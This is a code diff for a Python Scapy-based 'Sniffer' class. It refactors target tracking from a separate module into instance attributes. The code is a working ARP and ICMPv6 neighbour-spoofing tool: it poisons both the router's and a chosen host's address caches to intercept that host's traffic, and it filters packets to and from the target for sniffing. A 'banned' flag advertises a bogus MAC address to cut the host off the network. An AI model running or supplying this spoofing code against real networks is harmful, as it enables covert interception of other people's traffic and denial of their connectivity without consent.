@@ -9,8 +9,6 @@ from scapy.packet import Packet
 from scapy.sendrecv import sendp, sniff, srp1
 from scapy.utils6 import Net6
 
-import target
-
 
 class Sniffer:
     def __init__(self, iff=conf.iface, spoof_interval=3):
@@ -27,12 +25,16 @@ class Sniffer:
         self.router_ip = conf.route.route('0.0.0.0')[2]
         self.router_ip6 = conf.route6.route('::')[2]
         self.router_mac = l2.getmacbyip(self.router_ip)
+        self.target_ip = None
+        self.target_ip6 = None
+        self.target_mac = None
         print("Local IP   :", self.local_ip)
         print("Local IP6  :", self.local_ip6)
         print("Local MAC  :", self.local_mac)
         print("Router IP  :", self.router_ip)
         print("Router IP6 :", self.router_ip6)
         print("Router MAC :", self.router_mac)
+        self.banned = False
         self.spoof_interval = spoof_interval
 
     def scan(self, net: str, timeout=0.1) -> dict:
@@ -70,9 +72,9 @@ class Sniffer:
     def add(self, ip: str, ip6=None) -> bool:
         mac = l2.getmacbyip(ip)
         if mac is not None:
-            target.ip = ip
-            target.ip6 = ip6
-            target.mac = mac
+            self.target_ip = ip
+            self.target_ip6 = ip6
+            self.target_mac = mac
             return True
         return False
 
@@ -93,17 +95,17 @@ class Sniffer:
         ARP and ICMPv6 spoof router
         """
         while self.started:
-            mac = 'aa:bb:cc:dd:ee:ff' if target.banned else self.local_mac
+            mac = 'aa:bb:cc:dd:ee:ff' if self.banned else self.local_mac
             # ARP spoofing
-            if target.ip is not None:
+            if self.target_ip is not None:
                 p = l2.Ether(dst=self.router_mac) / \
-                    l2.ARP(op=2, psrc=target.ip, pdst=self.router_ip, hwsrc=mac)
+                    l2.ARP(op=2, psrc=self.target_ip, pdst=self.router_ip, hwsrc=mac)
                 sendp(p, verbose=False, iface=self.iff)
             # ICMPv6 neighbour spoofing
-            if target.ip6 is not None:
+            if self.target_ip6 is not None:
                 p = l2.Ether(dst=self.router_mac) / \
-                    inet6.IPv6(src=target.ip6, dst=self.router_ip6) / \
-                    inet6.ICMPv6ND_NA(tgt=target.ip6, R=0) / \
+                    inet6.IPv6(src=self.target_ip6, dst=self.router_ip6) / \
+                    inet6.ICMPv6ND_NA(tgt=self.target_ip6, R=0) / \
                     inet6.ICMPv6NDOptDstLLAddr(lladdr=mac)
                 sendp(p, verbose=False, iface=self.iff)
             time.sleep(self.spoof_interval)
@@ -114,14 +116,14 @@ class Sniffer:
         """
         while self.started:
             # ARP spoofing
-            if target.ip is not None:
-                p = l2.Ether(dst=target.mac) / \
-                    l2.ARP(op=2, psrc=self.router_ip, pdst=target.ip, hwsrc=self.local_mac)
+            if self.target_ip is not None:
+                p = l2.Ether(dst=self.target_mac) / \
+                    l2.ARP(op=2, psrc=self.router_ip, pdst=self.target_ip, hwsrc=self.local_mac)
                 sendp(p, verbose=False, iface=self.iff)
             # ICMPv6 neighbour spoofing
-            if target.ip6 is not None:
-                p = l2.Ether(dst=target.mac) / \
-                    inet6.IPv6(src=self.router_ip6, dst=target.ip6) / \
+            if self.target_ip6 is not None:
+                p = l2.Ether(dst=self.target_mac) / \
+                    inet6.IPv6(src=self.router_ip6, dst=self.target_ip6) / \
                     inet6.ICMPv6ND_NA(tgt=self.router_ip6, R=0) / \
                     inet6.ICMPv6NDOptDstLLAddr(lladdr=self.local_mac)
                 sendp(p, verbose=False, iface=self.iff)
@@ -134,8 +136,8 @@ class Sniffer:
         :param p: packet to be determined
         """
         if p.haslayer(inet.IP):
-            return target.ip in [p[inet.IP].src, p[inet.IP].dst]
+            return self.target_ip in [p[inet.IP].src, p[inet.IP].dst]
         elif p.haslayer(inet6.IPv6):
-            return target.ip6 in [p[inet6.IPv6].src, p[inet6.IPv6].dst]
+            return self.target_ip6 in [p[inet6.IPv6].src, p[inet6.IPv6].dst]
         else:
             return False
